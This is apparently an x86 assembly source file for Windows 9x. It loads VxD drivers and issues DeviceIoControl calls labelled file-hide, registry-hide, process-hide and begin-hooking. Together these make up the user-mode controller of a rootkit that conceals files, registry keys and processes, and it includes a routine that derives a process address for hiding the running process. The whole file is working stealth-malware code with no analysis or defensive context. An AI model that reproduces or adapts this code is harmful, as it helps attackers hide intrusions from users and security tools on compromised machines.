.386
.model flat,stdcall
include windows.inc
include kernel32.inc
includelib kernel32.lib
include user32.inc
includelib user32.lib

.data
AppName     db "DeviceIoControl",0
VxDName     db "\\.\RXFile.vxd",0
VxDNex      db "\\.\Rx.vxd",0
Success     db "The VxD is successfully loaded!",0
Failure     db "The VxD is not loaded!",0
;szFileHide  db "XDEADBEEF.LOG", 000h, "XDEADBEEF.log", 000h, "wang.log", 000h, "Calc.exe", 000h, 00Ah
;szRegHide   db "HKLM\Software\Windows\xxx", 000h, 00Ah
;szProcHide  db "CALC.EXE", 000h, 00Ah
szFileHide  db 1024 dup(41h)
szRegHide   db 1024 dup(42h)
szProcHide  db 1024 dup(43h)
szRoundAddr db 1024 dup(0)

.data?
hVxD      dd ?
hFileVxD  dd ?
tid       dd ?
unob      dd ?

.code
start:
	invoke CreateFile,addr VxDName,0,0,0,0,FILE_FLAG_DELETE_ON_CLOSE,0
	mov hFileVxD, eax

	.if hFileVxD !=INVALID_HANDLE_VALUE
		mov hVxD,eax

                xor ebx, ebx
                push ebx
                push ebx
                push ebx
                push ebx
                push 1024
                push offset szFileHide
                push 1 ; DIOC_FileHide
                push [hFileVxD]
                call DeviceIoControl

                xor ebx, ebx
                push ebx
                push ebx
                push ebx
                push ebx
                push 1024
                push offset szProcHide
                push 5 ; DIOC_BeginHooking
                push [hFileVxD]
                call DeviceIoControl
	.else
		
	.endif
	
	invoke Sleep, 5000
	
	invoke CreateFile,addr VxDNex,0,0,0,0,FILE_FLAG_DELETE_ON_CLOSE,0
        mov hVxD,eax
        
        xor ebx, ebx
        push ebx
        push ebx
        push ebx
        push ebx
        push 1024
        push offset szRegHide
        push 2 ; DIOC_RegistryHide
        push [hVxD]
        call DeviceIoControl

        xor ebx, ebx
        push ebx
        push ebx
        push ebx
        push ebx
        push 1024
        push offset szProcHide
        push 3 ; DIOC_ProcHide
        push [hVxD]
        call DeviceIoControl

        ; int 3

        call GetObfuscator
        mov [unob], eax

        call GetCurrentProcessId
        xor eax, [unob]
        and eax, 0FFFF0000h
        mov dword ptr [szRoundAddr], eax

        xor ebx, ebx
        push ebx
        push ebx
        push ebx
        push ebx
        push 1024
        push offset szRoundAddr
        push 4 ; DIOC_ProcRoundAddr
        push [hVxD]
        call DeviceIoControl

        xor ebx, ebx
        push ebx
        push ebx
        push ebx
        push ebx
        push 1024
        push offset szProcHide
        push 5 ; DIOC_BeginHooking
        push [hVxD]
        call DeviceIoControl

	invoke ExitProcess,NULL
	
	int 3
	int 3
	int 3

	; Copyright (c) 1995-2004 Matt Pietrek
	GetObfuscator proc
	    call GetCurrentThreadId
	    mov [tid], eax

	    mov ax, fs
            mov es, ax
            mov eax, 18h
            mov eax, es:[eax]
            sub eax, 10h
            xor eax,[tid]
            
            ret
	GetObfuscator endp
	
	push 0
	call ExitProcess
	
	int 3
	int 3
	int 3
end start
